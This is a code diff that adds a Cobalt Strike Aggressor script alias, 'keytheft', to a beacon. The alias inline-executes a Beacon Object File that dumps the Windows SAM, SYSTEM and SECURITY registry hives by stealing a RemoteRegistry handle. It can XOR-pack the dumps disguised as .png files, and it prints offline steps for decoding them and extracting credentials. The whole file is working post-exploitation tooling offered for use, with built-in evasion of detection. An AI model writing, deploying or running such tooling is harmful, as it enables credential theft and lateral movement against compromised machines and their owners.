@@ -1,0 +1,15 @@
+beacon_command_register("keytheft", "Dump SAM/SYSTEM/SECURITY hives via RemoteRegistry handle theft", "keytheft [p=1|0] [k=0|1] [sam=path] [sys=path] [sec=path]");
+
+alias keytheft {
+    local('$args $blob');
+    $args = substr($0, indexOf($0, " ") + 1);
+    if (strlen($args) < 1) {
+        println("keytheft: p=<1|0> k=<0|1> sam=<path.png> sys=<path.png> sec=<path.png>");
+        println("  p: XOR+PNG pack (default 1), k: keep plaintext .tmp (default 0)");
+        return;
+    }
+    $blob = bof_pack($1, "z", $args);
+    beacon_inline_execute($1, $blob, "go", null);
+    println("[*] keytheft running, keys print in beacon output; save them for decode.py");
+    println("[*] offline: python3 decode.py <keyhex> <file.png> then sam_extract.py sam.hiv system.hiv [security.hiv]");
+}
